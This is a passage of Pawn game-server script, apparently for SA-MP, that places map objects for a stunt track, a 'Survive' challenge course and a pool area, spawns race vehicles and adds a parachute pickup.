	CreateSObject(3437, 2022.42090, -3052.37915, 179.07257,   0.00000, 0.00000, 45.04459);
	CreateSObject(3437, 2024.08020, -3050.18604, 176.81570,   0.00000, 0.00000, 57.76620);
	CreateSObject(3437, 2025.27380, -3047.63013, 174.72861,   0.00000, 0.00000, 70.42919);
	CreateSObject(3437, 2026.07800, -3044.98779, 172.57741,   0.00000, 0.00000, 80.02470);
	CreateSObject(9833, 2008.53088, -3028.77783, 176.53329,   0.00000, 0.00000, 0.00000);
	CreateSObject(9833, 2008.44104, -3019.09888, 176.53329,   0.00000, 0.00000, 0.00000);
	CreateSObject(9833, 2008.37915, -3011.24414, 176.53329,   0.00000, 0.00000, 0.00000);
	CreateSObject(9833, 2008.40027, -3003.61353, 176.53329,   0.00000, 0.00000, 0.00000);
	CreateSObject(7230, 2010.17627, -3052.47534, 183.40154,   0.00000, 0.00000, 0.00000);
	CreateSObject(7231, 2010.26721, -3052.41504, 183.40150,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, 2021.65564, -3050.39526, 174.02914,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, 2023.45056, -3045.82495, 174.02910,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, 1997.01978, -3049.74048, 174.02910,   0.00000, 0.00000, 0.48000);
	CreateSObject(3515, 1995.65588, -3045.42603, 174.02910,   0.00000, 0.00000, 0.48000);
	CreateSObject(3524, 2004.97656, -2976.93896, 174.95209,   0.00000, 0.00000, 0.00000);
	CreateSObject(3524, 2014.60449, -2977.15039, 174.95209,   0.00000, 0.00000, 0.00000);
	CreateSObject(6965, 2008.69897, -3051.51489, 173.58795,   0.00000, 0.00000, 0.00000);
	CreateSObject(13562, 2025.07141, -2978.08179, 174.93698,   0.00000, 0.00000, 0.00000);
	CreateSObject(13562, 1992.59155, -2978.46851, 174.93698,   0.00000, 0.00000, 0.00000);
	CreateSObject(7073, 2009.47803, -2970.77515, 202.38071,   0.00000, 0.00000, 90.00000);
	CreateSObject(19005, 2005.06091, -2588.87036, 14.46520,   0.00000, 0.00000, 0.69450);
	CreateSObject(19688, 1978.35461, -2425.09912, 16.44835,   0.00000, 0.00000, 271.92722);
	CreateSObject(19689, 1977.54480, -2400.90063, 21.28280,   0.00000, 0.00000, 271.92719);
	CreateSObject(19688, 1976.77673, -2380.52124, 34.96440,   0.00000, 0.00000, 271.92719);
	CreateSObject(19654, 1992.41760, -2367.95898, 42.40050,   0.00000, 0.00000, 271.92719);
	CreateSObject(19682, 1978.49060, -2356.31104, 47.36610,   0.00000, 0.00000, 271.83331);
	CreateSObject(19681, 1991.67285, -2335.35791, 47.31810,   0.00000, 0.00000, 91.31767);
	CreateSObject(19649, 1993.78345, -2298.36304, 47.29780,   0.00000, 0.00000, 270.00000);
	CreateSObject(19656, 2009.32312, -2262.45874, 52.27510,   0.00000, 0.00000, 271.60669);
	CreateSObject(19649, 1993.78345, -2298.36304, 52.78568,   0.00000, 180.00000, 270.00000);
	CreateSObject(19656, 2009.32312, -2262.45874, 57.73800,   180.00000, 0.00000, 271.60669);
	CreateSObject(19663, 2026.47839, -2297.52686, 54.96980,   0.00000, 0.00000, 92.20290);
	CreateSObject(19683, 2027.69336, -2333.83228, 59.40000,   0.00000, 0.00000, 91.38790);
	CreateSObject(19652, 2012.06372, -2346.80420, 70.20123,   0.00000, 0.00000, 92.45903);
	CreateSObject(19652, 2012.06372, -2346.80420, 75.74883,   0.00000, 180.00000, 92.45900);
	CreateSObject(19652, 2012.06372, -2346.80420, 90.09280,   0.00000, 0.00000, 92.45900);
	CreateSObject(19652, 2012.06372, -2346.80420, 95.59520,   0.00000, 180.00000, 92.45900);
	CreateSObject(19685, 2028.95569, -2358.37500, 100.94100,   0.00000, 0.00000, 94.69630);
	CreateSObject(19683, 2030.97729, -2382.32593, 105.70020,   0.00000, 0.00000, 94.69630);
	CreateSObject(19682, 2030.58484, -2406.78662, 106.51450,   0.00000, 0.00000, 94.78200);
	CreateSObject(19682, 2015.96729, -2425.97754, 106.51450,   0.00000, 0.00000, 55.64371);
	CreateSObject(19655, 1996.44580, -2447.85083, 101.46629,   0.00000, 0.00000, 8.41308);
	CreateSObject(19655, 2017.37781, -2444.68164, 91.51110,   0.00000, 0.00000, 188.77560);
	CreateSObject(19649, 1979.76172, -2433.98340, 86.48330,   0.00000, 0.00000, 7.79860);
	CreateSObject(19689, 1943.02393, -2438.80151, 88.93000,   0.00000, 0.00000, 6.82660);
	CreateSObject(19688, 1922.62048, -2441.23315, 102.64190,   0.00000, 0.00000, 6.82660);
	CreateSObject(19689, 1898.54565, -2444.08057, 107.47043,   0.00000, 0.00000, 6.82660);
	CreateSObject(19688, 1878.78821, -2446.50708, 120.65350,   0.00000, 0.00000, 6.82660);
	CreateSObject(19656, 1854.33044, -2433.75293, 127.97710,   0.00000, 0.00000, 8.41310);
	CreateSObject(19653, 1860.12769, -2400.72949, 127.97710,   0.00000, 0.00000, 8.62012);
	CreateSObject(19653, 1859.72009, -2400.77881, 117.96150,   0.00000, 0.00000, 9.55364);
	CreateSObject(19649, 1886.89685, -2412.39111, 112.95540,   0.00000, 0.00000, 189.37560);
	CreateSObject(19684, 1923.66211, -2406.51929, 112.13910,   0.00000, 0.00000, 8.17155);
	CreateSObject(19686, 1947.68323, -2403.04810, 107.34550,   0.00000, 0.00000, 8.17160);
	CreateSObject(19681, 1971.35950, -2397.50146, 106.53458,   0.00000, 0.00000, 51.78979);
	CreateSObject(19681, 1986.44214, -2378.71680, 106.53458,   0.00000, 0.00000, 95.96871);
	CreateSObject(19681, 1983.68481, -2354.89087, 106.53458,   0.00000, 0.00000, 142.45189);
	CreateSObject(19661, 1970.29651, -2334.86572, 106.55400,   0.00000, 0.00000, 322.45636);
	CreateSObject(19652, 1985.29846, -2332.87549, 116.50750,   0.00000, 0.00000, 232.84840);
	CreateSObject(19652, 1985.29749, -2332.99243, 136.40379,   0.00000, 0.00000, 232.84840);
	CreateSObject(19652, 1985.29749, -2332.99243, 156.44402,   0.00000, 0.00000, 232.84840);
	CreateSObject(19652, 1985.29846, -2332.87549, 121.87486,   0.00000, 180.00000, 232.64238);
	CreateSObject(19652, 1985.29749, -2332.99243, 141.89638,   0.00000, 180.00000, 232.84840);
	CreateSObject(19652, 1985.29749, -2332.99243, 161.93721,   0.00000, 180.00000, 232.84840);
	CreateSObject(19655, 1966.86072, -2305.19678, 161.51355,   0.00000, 0.00000, 230.94142);
	CreateSObject(19655, 1966.86072, -2305.19678, 166.92374,   180.00000, 0.00000, 230.94141);
	CreateSObject(19649, 1931.28296, -2321.72778, 156.56210,   0.00000, 0.00000, 47.99436);
	CreateSObject(19649, 1931.28296, -2321.72778, 161.87100,   0.00000, 180.00000, 47.99440);
	CreateSObject(19655, 1919.32410, -2358.84253, 151.58321,   0.00000, 0.00000, 48.17090);
	CreateSObject(19655, 1919.32410, -2358.84253, 156.89420,   180.00000, 0.00000, 48.17090);
	CreateSObject(19655, 1933.93921, -2342.96387, 141.66229,   0.00000, 0.00000, 226.58749);
	CreateSObject(19655, 1933.93921, -2342.96387, 146.92191,   180.00000, 0.00000, 226.58749);
	CreateSObject(19663, 1897.13538, -2356.41821, 134.60040,   0.00000, 0.00000, 42.85530);
	CreateSObject(19664, 1862.68567, -2388.11060, 138.48680,   0.00000, 0.00000, 42.85530);
	CreateSObject(19652, 1833.17139, -2393.82031, 146.28130,   0.00000, 0.00000, 45.79770);
	CreateSObject(19652, 1833.17139, -2393.82031, 151.55708,   0.00000, 180.00000, 45.79770);
	CreateSObject(19649, 1827.85181, -2423.09937, 156.33360,   0.00000, 0.00000, 47.42610);
	CreateSObject(19655, 1815.53687, -2460.07739, 151.33060,   0.00000, 0.00000, 47.57270);
	CreateSObject(19649, 1851.93970, -2445.65625, 146.35370,   0.00000, 0.00000, 224.57594);
	CreateSObject(19658, 1888.18689, -2431.75073, 148.87180,   0.00000, 0.00000, 226.53740);
	CreateSObject(19653, 1904.04980, -2461.21460, 146.42490,   0.00000, 0.00000, 226.78839);
	CreateSObject(19653, 1904.04980, -2461.21460, 136.41840,   0.00000, 0.00000, 226.78841);
	CreateSObject(19649, 1875.17798, -2468.28613, 131.42220,   0.00000, 0.00000, 46.10407);
	CreateSObject(19649, 1840.77515, -2504.03735, 131.42220,   0.00000, 0.00000, 46.10407);
	CreateSObject(19653, 1834.28699, -2533.64893, 126.49648,   0.00000, 0.00000, 309.87622);
	CreateSObject(19662, 1819.29333, -2532.42310, 131.50130,   0.00000, 0.00000, 310.25110);
	CreateSObject(19649, 1837.75916, -2563.11304, 121.54630,   0.00000, 0.00000, 489.21960);
	CreateSObject(19653, 1866.05933, -2572.66431, 116.51820,   0.00000, 0.00000, 307.71811);
	CreateSObject(19653, 1866.07141, -2572.64990, 106.49430,   0.00000, 0.00000, 307.71811);
	CreateSObject(19653, 1866.08911, -2572.69116, 96.51290,   0.00000, 0.00000, 307.71811);
	CreateSObject(19653, 1866.08911, -2572.69116, 86.51309,   0.00000, 0.00000, 307.71811);
	CreateSObject(19653, 1866.08911, -2572.69116, 76.39548,   0.00000, 0.00000, 307.71811);
	CreateSObject(19653, 1866.08911, -2572.69116, 66.32881,   0.00000, 0.00000, 307.71811);
	CreateSObject(19653, 1866.08911, -2572.69116, 56.42040,   0.00000, 0.00000, 307.71811);
	CreateSObject(19653, 1866.00378, -2572.46191, 46.25893,   0.00000, 0.00000, 307.71811);
	CreateSObject(19653, 1866.00378, -2572.46191, 36.20280,   0.00000, 0.00000, 307.71811);
	CreateSObject(19653, 1866.00378, -2572.46191, 26.20720,   0.00000, 0.00000, 307.71811);
	CreateSObject(19655, 1872.51367, -2581.15918, 16.18120,   0.00000, 0.00000, 126.74390);
	CreateVehicleEx(411,1398.6278,-2499.0610,13.2818,269.0706,112,1,respawntime,0,world_normal); // Infernus-ApRace
	CreateVehicleEx(411,1398.6477,-2503.1731,13.2818,269.6917,106,1,respawntime,0,world_normal); // Infernus-ApRace
	CreateVehicleEx(451,1398.0806,-2490.0244,13.2607,270.3638,46,46,respawntime,0,world_normal); // Turismo-ApRace
	CreateVehicleEx(451,1397.6757,-2485.1926,13.2606,271.9688,18,18,respawntime,0,world_normal); // Turismo-ApRace
	CreateVehicleEx(522,1396.8192,-2479.3884,13.1147,273.0496,1,1,respawntime,0,world_normal); // NRG500-ApRace
	CreateVehicleEx(522,1396.6797,-2477.4912,13.1291,270.7928,1,1,respawntime,0,world_normal); // NRG500-ApRace
	CreateVehicleEx(522,1397.0996,-2481.1919,13.1254,268.3892,1,1,respawntime,0,world_normal); // NRG500-ApRace
	dbg(11,"6c");
	// Survive
	CreateSObject(4585, 0.8974609375, 1531.798828125, 91.544052124023, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(979, 25.470176696777, 1535.4244384766, 12.590220451355, 0, 0, 180, object_show_distance, 0, world_challenges);
	CreateSObject(979, 25.380500793457, 1530.2912597656, 12.590220451355, 0, 0, 183.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(980, 20.913375854492, 1517.2473144531, 19.874351501465, 90, 126, 326, object_show_distance, 0, world_challenges);
	CreateSObject(1454, 21.331411361694, 1531.5684814453, 13.180376052856, 0, 0, 272, object_show_distance, 0, world_challenges);
	CreateSObject(1454, 21.427963256836, 1528.1494140625, 15.239909172058, 0, 0, 271.99951171875, object_show_distance, 0, world_challenges);
	CreateSObject(1454, 21.5390625, 1525.0615234375, 17.140037536621, 0, 0, 271.99951171875, object_show_distance, 0, world_challenges);
	CreateSObject(978, 19.2109375, 1507.7880859375, 20.176525115967, 0, 0, 233.99780273438, object_show_distance, 0, world_challenges);
	CreateSObject(6976, 13.775390625, 1504.5517578125, 22.922245025635, 0, 0, 175.99548339844, object_show_distance, 0, world_challenges);
	CreateSObject(973, -7.796875, 1505.791015625, 32.526832580566, 90, 0, 357.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(1454, -12.922277450562, 1505.9389648438, 32.023921966553, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1454, -15.589168548584, 1505.9837646484, 34.334438323975, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1454, -12.457627296448, 1505.9300537109, 37.58337020874, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3502, -6.8379559516907, 1505.9300537109, 39.362503051758, 0, 0, 92, object_show_distance, 0, world_challenges);
	CreateSObject(3502, 1.7514655590057, 1506.3005371094, 41.541912078857, 0, 0, 91.99951171875, object_show_distance, 0, world_challenges);
	CreateSObject(3502, 10.552778244019, 1506.6301269531, 44.535682678223, 0, 0, 91.99951171875, object_show_distance, 0, world_challenges);
	CreateSObject(987, 14.5791015625, 1506.7900390625, 40.118717193604, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(987, 26.518178939819, 1506.8068847656, 40.117462158203, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1391, 42.7509765625, 1529.45703125, 61.61922454834, 0, 45.999755859375, 91.99951171875, object_show_distance, 0, world_challenges);
	CreateSObject(7317, 45.27029800415, 1559.3951416016, 73.33716583252, 0, 0, 266, object_show_distance, 0, world_challenges);
	CreateSObject(8075, 28.475576400757, 1572.9276123047, 76.700065612793, 0, 0, 88, object_show_distance, 0, world_challenges);
	CreateSObject(3578, 16.924196243286, 1570.0721435547, 78.710655212402, 0, 89, 268, object_show_distance, 0, world_challenges);
	CreateSObject(3578, 14.19831943512, 1570.0368652344, 82.03148651123, 0, 88.994750976563, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(3578, 14.1787109375, 1567.294921875, 85.317695617676, 0, 88.9892578125, 87.989501953125, object_show_distance, 0, world_challenges);
	CreateSObject(18367, -26.493207931519, 1564.3026123047, 91.812438964844, 330, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(18367, -26.377071380615, 1541.0191650391, 111.19976806641, 329.99633789063, 0, 180, object_show_distance, 0, world_challenges);
	CreateSObject(7933, -20.261226654053, 1563.5609130859, 130.96398925781, 0, 340, 0, object_show_distance, 0, world_challenges);
	CreateSObject(7933, -10.3564453125, 1566.6953125, 133.22758483887, 339.99938964844, 0, 179.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(3399, 40.828125, 1578.0166015625, 135.84101867676, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3399, 39.7880859375, 1588.19140625, 136.10488891602, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(3399, 41.344833374023, 1569.6912841797, 136.0055847168, 0, 0, 345.99792480469, object_show_distance, 0, world_challenges);
	CreateSObject(18367, 46.087913513184, 1588.1060791016, 138.29925537109, 0, 0, 72, object_show_distance, 0, world_challenges);
	CreateSObject(18367, 46.4501953125, 1577.9052734375, 137.91754150391, 0, 0, 63.989868164063, object_show_distance, 0, world_challenges);
	CreateSObject(2780, 73.848503112793, 1563.3762207031, 140.30462646484, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2780, 76.0634765625, 1578.7578125, 138.1884765625, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(980, 79.901382446289, 1576.7576904297, 139.34303283691, 90, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(18367, 85.000640869141, 1577.2668457031, 138.9084777832, 0, 0, 71.998901367188, object_show_distance, 0, world_challenges);
	CreateSObject(1391, 106.89576721191, 1560.5913085938, 149.02429199219, 0, 129.99978637695, 49.99951171875, object_show_distance, 0, world_challenges);
	CreateSObject(978, 91.300926208496, 1549.9547119141, 165.49546813965, 0, 0, 145.9977722168, object_show_distance, 0, world_challenges);
	CreateSObject(978, 85.352058410645, 1554.0437011719, 165.48489379883, 0, 0, 145.9973449707, object_show_distance, 0, world_challenges);
	CreateSObject(6052, 66.22785949707, 1469.4362792969, 166.12351989746, 0, 0, 266, object_show_distance, 0, world_challenges);
	CreateSObject(6052, 78.24292755127, 1484.615234375, 165.5767364502, 0, 11.9970703125, 111.99462890625, object_show_distance, 0, world_challenges);
	CreateSObject(18367, 56.642349243164, 1462.1904296875, 168.23443603516, 340, 0, 243.98986816406, object_show_distance, 0, world_challenges);
	CreateSObject(18367, 32.703414916992, 1473.7399902344, 181.39859008789, 347.99938964844, 0, 243.984375, object_show_distance, 0, world_challenges);
	CreateSObject(979, 82.591667175293, 1501.4451904297, 165.23843383789, 0, 339.99938964844, 275.98962402344, object_show_distance, 0, world_challenges);
	CreateSObject(987, -2.6687097549438, 1508.2415771484, 185.22875976563, 0, 0, 272, object_show_distance, 0, world_challenges);
	CreateSObject(987, -2.2637445926666, 1496.3387451172, 185.22720336914, 0, 0, 271.99951171875, object_show_distance, 0, world_challenges);
	CreateSObject(973, 2.2862901687622, 1486.0244140625, 191.34671020508, 90, 0, 359.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(2780, 74.419708251953, 1574.3083496094, 138.45788574219, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(18609, 13.546875, 1566.853515625, 93.877342224121, 0, 0, 87.994995117188, object_show_distance, 0, world_challenges);
	CreateSObject(18609, 8.6609373092651, 1567.1595458984, 93.787551879883, 0, 0, 87.989501953125, object_show_distance, 0, world_challenges);
	CreateSObject(12917, -5.7349305152893, 1571.8272705078, 93.032279968262, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(1337, 5.93359375, 1566.900390625, 93.856117248535, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(6976, -22.993885040283, 1565.5728759766, 94.900726318359, 0, 40, 0, object_show_distance, 0, world_challenges);
	CreateSObject(980, -2.3647327423096, 1565.1331787109, 133.13967895508, 90, 0, 268, object_show_distance, 0, world_challenges);
	CreateSObject(980, -1.943901181221, 1576.6811523438, 133.1939239502, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, -1.5283203125, 1588.1708984375, 133.1947479248, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 4.0022959709167, 1587.970703125, 133.19139099121, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 3.6174631118774, 1576.4938964844, 133.19198608398, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 3.1824533939362, 1564.9876708984, 133.19155883789, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 8.7131786346436, 1564.7355957031, 133.19302368164, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 9.0960102081299, 1576.2746582031, 133.19329833984, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 9.4958209991455, 1587.7891845703, 133.19728088379, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 14.9059715271, 1587.6766357422, 133.19161987305, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 14.613173484802, 1576.1571044922, 133.19604492188, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 14.27091217041, 1564.6159667969, 133.19277954102, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 20.5205078125, 1587.51953125, 133.19192504883, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 26.044284820557, 1587.3449707031, 133.19453430176, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 31.543138504028, 1587.1491699219, 133.19567871094, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 36.906433105469, 1586.9500732422, 133.19145202637, 90, 0, 268, object_show_distance, 0, world_challenges);
	CreateSObject(980, 20.078493118286, 1576.0008544922, 133.19441223145, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 19.73042678833, 1564.4385986328, 133.1955871582, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 25.6328125, 1575.84375, 133.19046020508, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 31.0908203125, 1575.619140625, 133.19187927246, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 36.580078125, 1575.4921875, 133.19625854492, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 25.2998046875, 1564.271484375, 133.19619750977, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 30.873046875, 1559.12109375, 133.19804382324, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 36.397857666016, 1558.9611816406, 133.19869995117, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(987, -3.982421875, 1594.021484375, 133.19161987305, 0, 0, 357.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(987, 7.8916015625, 1593.59375, 133.24272155762, 0, 0, 357.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 19.83984375, 1593.26171875, 133.19529724121, 0, 0, 357.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 31.7890625, 1592.873046875, 133.24111938477, 0, 0, 357.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 39.690765380859, 1600.8698730469, 133.47793579102, 0, 0, 268, object_show_distance, 0, world_challenges);
	CreateSObject(987, 38.933048248291, 1589.3166503906, 128.59846496582, 0, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(987, 38.439170837402, 1576.8117675781, 128.24169921875, 0, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(987, 38.0029296875, 1564.8359375, 133.244140625, 0, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(987, 37.7802734375, 1558.9326171875, 133.32562255859, 0, 0, 179.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(987, 25.716796875, 1558.6162109375, 133.24163818359, 0, 0, 179.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(987, 13.801609992981, 1558.8869628906, 133.23822021484, 0, 0, 177.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(987, 6.3872561454773, 1559.3029785156, 133.23846435547, 0, 0, 177.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 0.35683441162109, 1559.6586914063, 133.40458679199, 0, 0, 139.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, -3.9915161132813, 1582.2613525391, 133.23936462402, 0, 0, 90, object_show_distance, 0, world_challenges);
	CreateSObject(987, -4.1704158782959, 1570.5997314453, 133.18511962891, 0, 0, 90, object_show_distance, 0, world_challenges);
	CreateSObject(987, 28.203649520874, 1586.0853271484, 133.23997497559, 0, 0, 357.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 23.937921524048, 1569.7702636719, 133.24163818359, 0, 0, 89.989501953125, object_show_distance, 0, world_challenges);
	CreateSObject(987, 16.469903945923, 1586.5671386719, 133.23706054688, 0, 0, 357.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 3.711199760437, 1592.0015869141, 133.23683166504, 0, 0, 357.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 15.169806480408, 1579.5242919922, 133.2414855957, 0, 0, 90, object_show_distance, 0, world_challenges);
	CreateSObject(987, -2.9933013916016, 1592.1687011719, 133.24018859863, 0, 0, 357.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 2.7884213924408, 1579.7982177734, 133.23742675781, 0, 0, 357.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, -0.35170245170593, 1579.9217529297, 133.23936462402, 0, 0, 357.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, -0.10854363441467, 1570.4191894531, 133.18511962891, 0, 0, 357.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 11.383432388306, 1570.1241455078, 133.23846435547, 0, 0, 357.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 5.5509147644043, 1574.6947021484, 133.23742675781, 0, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(987, 18.850156784058, 1564.2528076172, 133.24102783203, 0, 0, 179.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(987, 27.512250900269, 1563.9449462891, 133.24163818359, 0, 0, 179.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(987, 28.385301589966, 1576.3850097656, 133.23731994629, 0, 0, 357.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 24.20990562439, 1576.4227294922, 133.23590087891, 0, 0, 357.98950195313, object_show_distance, 0, world_challenges);
	CreateSObject(987, 38.77490234375, 1567.7895507813, 133.244140625, 0, 0, 179.99450683594, object_show_distance, 0, world_challenges);
	CreateSObject(987, 27.754901885986, 1560.7165527344, 133.24163818359, 0, 0, 89.989013671875, object_show_distance, 0, world_challenges);
	CreateSObject(980, 36.032917022705, 1573.3581542969, 133.01509094238, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(980, 32.325439453125, 1573.6270751953, 133.01071166992, 90, 0, 267.99499511719, object_show_distance, 0, world_challenges);
	CreateSObject(2773, 81.323852539063, 1556.470703125, 165.85581970215, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2773, 81.291984558105, 1552.6177978516, 165.8558807373, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2773, 81.291152954102, 1548.7584228516, 165.83598327637, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2773, 81.294326782227, 1544.7523193359, 165.8306427002, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2773, 81.29517364502, 1540.7532958984, 165.83840942383, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2773, 81.298355102539, 1536.7556152344, 165.83023071289, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2773, 81.294486999512, 1532.7548828125, 165.83094787598, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2773, 81.296524047852, 1528.7512207031, 165.83329772949, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2773, 81.297309875488, 1524.7502441406, 165.83206176758, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2773, 81.29273223877, 1520.7508544922, 165.83087158203, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2773, 81.298606872559, 1516.7529296875, 165.83053588867, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2773, 81.299949645996, 1512.7579345703, 165.83090209961, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreateSObject(2773, 81.295822143555, 1508.7596435547, 165.83702087402, 0, 0, 0, object_show_distance, 0, world_challenges);
	CreatePickupEx(371,2,-17.6713,1530.5360,192.3878,0,world_challenges); // survive_para
	dbg(11,"6c1");
	// Pool
	CreateSObject(4563, 703.742249, -2699.414063, 27.288231, 271.4780, 0.0000, 181.4091);
	CreateSObject(4563, 636.884583, -2874.236572, 14.704725, 1.7180, 88.5211, 181.3288);
	CreateSObject(4563, 497.879028, -2831.113281, 26.964310, 270.6186, 0.0000, 0.0000);
	CreateSObject(4563, 597.815552, -2674.842285, 17.979935, 0.0000, 269.8909, 179.9996);
	CreateSObject(4563, 575.674072, -2828.769287, -24.802048, 269.7591, 0.0000, 269.9998);
	CreateSObject(4563, 527.899902, -2818.836426, -27.398157, 270.6186, 0.0000, 0.0000);
	CreateSObject(4563, 673.982422, -2728.737793, -27.280342, 90.1140, 357.7655, 1.7180);
	CreateSObject(4563, 644.368713, -2707.804443, -26.498631, 90.0681, 0.0000, 269.9998);
	CreateSObject(4585, 562.740234, -2762.263916, -40.898857, 270.4467, 0.0000, 0.0000);
	CreateSObject(4585, 594.366760, -2785.659180, -41.857910, 269.7591, 0.0000, 0.0000);
	CreateSObject(4585, 629.325867, -2766.932617, -41.799927, 270.0170, 0.0000, 0.0000);
	CreateSObject(8419, 551.316528, -2741.108887, 50.986286, 180.6986, 0.0000, 0.0000);
	CreateSObject(8419, 550.257996, -2833.862549, 49.112797, 181.5809, 0.0000, 0.0000);
	CreateSObject(8419, 600.334229, -2742.396240, 50.950516, 180.6986, 0.0000, 0.0000);
	CreateSObject(8419, 599.552917, -2822.599854, 49.451164, 181.3861, 0.0000, 0.0000);
	CreateSObject(8419, 651.144287, -2737.334717, 51.029926, 180.7387, 0.0000, 0.0000);
	CreateSObject(8419, 651.276306, -2822.112793, 49.407043, 181.1971, 0.0000, 0.0000);
	CreateSObject(14537, 599.450684, -2720.552490, 5.440378, 0.0000, 0.0000, 0.0000);
	CreateSObject(1594, 608.772278, -2720.134766, 3.983664, 0.0000, 0.0000, 0.0000);
	CreateSObject(1594, 608.926941, -2729.871338, 3.983549, 0.0000, 0.0000, 0.0000);
	CreateSObject(1594, 599.431946, -2729.961182, 3.972261, 0.0000, 0.0000, 1.7189);
	CreateSObject(1594, 590.155579, -2729.816162, 3.961117, 0.0000, 0.0000, 0.0000);
	CreateSObject(1594, 589.914978, -2720.957275, 3.960951, 0.0000, 0.0000, 0.0000);
	CreateSObject(1594, 590.111145, -2711.295898, 3.961153, 0.0000, 0.0000, 0.0000);
	CreateSObject(1594, 599.536011, -2711.276611, 3.973040, 0.0000, 0.0000, 0.0000);
	CreateSObject(1594, 608.511047, -2711.280762, 3.983679, 0.0000, 0.0000, 0.0000);
	CreateSObject(2425, 604.430725, -2720.780273, 4.607692, 0.0000, 0.0000, 270.0000);
	CreateSObject(2427, 599.365051, -2725.269287, 4.607692, 0.0000, 0.0000, 180.0000);
	CreateSObject(2429, 594.415710, -2720.408936, 5.110172, 0.0000, 0.0000, 90.0000);
	CreateSObject(2453, 599.436707, -2715.980713, 4.988580, 0.0000, 0.0000, 0.0000);
